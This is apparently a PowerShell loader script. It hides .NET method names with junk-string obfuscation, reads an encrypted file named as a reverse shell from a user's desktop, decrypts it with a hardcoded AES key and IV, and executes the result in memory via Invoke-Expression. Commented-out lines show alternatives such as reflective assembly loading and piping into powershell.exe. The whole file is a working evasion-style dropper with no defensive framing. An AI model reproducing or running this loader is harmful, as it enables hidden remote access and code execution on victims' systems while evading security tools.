$fElA='CreqIbHaqIbHtqIbHeqIbHDqIbHecrqIbHyptqIbHorqIbH'.Replace('qIbH', ''),'Loryaoaryaodryao'.Replace('ryao', ''),'EnxJSYtxJSYrxJSYyPxJSYoxJSYintxJSY'.Replace('xJSY', ''),'RCglSeadCglSLCglSinCglSesCglS'.Replace('CglS', ''),'ElkpuDekpuDmekpuDnkpuDtkpuDAtkpuD'.Replace('kpuD', ''),'MaitKRenMotKRedultKReetKRe'.Replace('tKRe', ''),'FrEHVHoEHVHmBaEHVHseEHVH6EHVH4SEHVHtriEHVHngEHVH'.Replace('EHVH', ''),'ChaNRYJnNRYJgeNRYJExtNRYJenNRYJsioNRYJnNRYJ'.Replace('NRYJ', ''),'CopLofSyTLofSoLofS'.Replace('LofS', ''),'InvLlecoLleckeLlec'.Replace('Llec', ''),'SpNSkZlitNSkZ'.Replace('NSkZ', ''),'DexTMTcomxTMTprxTMTexTMTsxTMTsxTMT'.Replace('xTMT', ''),'TraXCkmnsXCkmfXCkmoXCkmrmXCkmFXCkminaXCkmlBlXCkmoXCkmckXCkm'.Replace('XCkm', ''),'GetrUltCurUltrrrUltenrUlttrUltPrUltrrUltocrUltesrUltsrUlt'.Replace('rUlt', ''), 'RGktjreGktjradGktjrAGktjrllGktjrBGktjrytGktjres'.replace('Gktjr','');
#$KcXpf = [System.Convert]::($fElA[6])("eh6cMkJ2HBbouvVlbHjdyw==")
#read file
$KcXpf = [System.IO.File]::($fEla[14])('C:\Users\KuznetsovAntA\Desktop\hardware_bp_rev_shell.txt.bin')

$yTtPD=[System.Security.Cryptography.Aes]::Create();
$yTtPD.Mode=[System.Security.Cryptography.CipherMode]::CBC;
$yTtPD.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
$yTtPD.Key=[System.Convert]::($fElA[6])('rRWyCyQLtuqH/zi2mhFDObO+dhUUkEuGFZ7FgqLLt14=');
$yTtPD.IV=[System.Convert]::($fElA[6])('dn2lq2CDURZOe442/46czQ==');
$lVePM=$yTtPD.($fElA[0])();
$JjJvL=$lVePM.($fElA[12])($KcXpf,0,$KcXpf.Length);
$lVePM.Dispose();
$yTtPD.Dispose();
#$JjJvL | IEX;

#[System.Reflection.Assembly]::($fElA[1])([byte[]]$JjJvL);

IEX([System.Text.Encoding]::UTF8.GetString($JjJvL)) | IEX;

#write to file
#[System.IO.File]::WriteAllBytes('C:\Users\KuznetsovAntA\Desktop\hardware_bp_rev_shell_decr.txt', $JjJvL)

#[System.Reflection.Assembly]::Load([byte[]]$Var).EntryPoint.Invoke($null,$null); 

#[System.Text.Encoding]::Default.GetString([System.Convert]::($fElA[6])($fjhgt)) | powershell.exe;